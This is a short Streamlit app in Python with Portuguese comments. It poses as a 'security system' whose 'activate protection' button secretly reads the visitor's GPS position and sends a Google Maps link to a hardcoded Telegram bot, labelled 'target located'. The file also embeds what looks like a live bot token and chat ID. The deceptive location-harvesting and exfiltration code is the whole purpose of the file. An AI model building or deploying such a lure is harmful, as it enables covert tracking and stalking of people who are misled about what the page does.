import streamlit as st
import requests
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONEXÃO TELEGRAM
TOKEN_BOT = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
SEU_ID = "8210828398"

def enviar_telegram(mensagem):
    url = f"https://api.telegram.org/bot{TOKEN_BOT}/sendMessage"
    payload = {"chat_id": SEU_ID, "text": mensagem, "parse_mode": "Markdown"}
    try:
        requests.post(url, json=payload)
    except:
        pass

# 2. CONFIGURAÇÃO (CUIDADO COM A VÍRGULA!)
st.set_page_config(page_title="SISTEMA ATIVO", page_icon="🔐", layout="centered")

# 3. TÍTULO E RADAR
st.markdown("<h1 style='text-align: center; color: #ffc107;'>🛡️ SISTEMA DE SEGURANÇA</h1>", unsafe_allow_html=True)
st.markdown("""
    <style>
    .main { background-color: #0d1117; }
    div.stButton > button {
        background-color: #ffc107 !important;
        color: black !important;
        font-weight: bold !important;
        width: 100%;
        height: 4em;
        border-radius: 10px;
    }
    </style>
    """, unsafe_allow_html=True)

# 4. LÓGICA DO GPS
loc = get_geolocation()

if st.button("🔴 ATIVAR PROTEÇÃO"):
    if loc:
        st.info("🛰️ Localização Concluída!") # ISSO TEM QUE APARECER AGORA
        lat = loc['coords']['latitude']
        lon = loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        msg = f"🚨 ALVO LOCALIZADO!\n\n📍 Mapa: {mapa}"
        enviar_telegram(msg)
        st.success("✅ Alerta enviado ao Telegram!")
    else:
        st.error("⚠️ Erro: Por favor, autorize o GPS no seu navegador e tente de novo.")
